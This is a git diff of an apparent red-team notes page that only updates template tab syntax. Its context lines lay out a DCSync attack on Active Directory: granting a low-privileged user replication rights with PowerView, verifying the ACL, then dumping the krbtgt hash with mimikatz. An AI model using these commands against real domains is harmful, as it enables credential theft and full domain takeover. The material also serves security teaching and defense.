@@ -24,13 +24,13 @@ Inspecting domain's `offense.local` permissions, it can be observed that user `s
 
 Using PowerView, we can grant user `spotless` 3 rights that would allow them to grab password hashes from the DC:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 Add-ObjectACL -PrincipalIdentity spotless -Rights DCSync
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Below shows the above command and also proves that spotless does not belong to any privileged group:
 
@@ -46,26 +46,26 @@ Let's grab the SID of the user spotless with `whoami /all`:
 
 Using powerview, let's check that the user `spotless` `S-1-5-21-2552734371-813931464-1050690807-1106` has the same privileges as seen above using the GUI:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 Get-ObjectAcl -Identity "dc=offense,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-2552734371-813931464-1050690807-1106"}
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-09-14-27-54.png)
 
 Additionally, we can achieve the same result without PowerView if we have access to AD Powershell module:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 Import-Module ActiveDirectory
 (Get-Acl "ad:\dc=offense,dc=local").Access | ? {$_.IdentityReference -match 'spotless' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-09-15-11-36.png)
 
@@ -75,13 +75,13 @@ See [Active Directory Enumeration with AD Module without RSAT or Admin Privilege
 
 Since the user `spotless` has now the required privileges to use `DCSync`, we can use mimikatz to dump password hashes from the DC via:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 lsadump::dcsync /user:krbtgt
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-09-14-34-44%20%281%29.png)
 
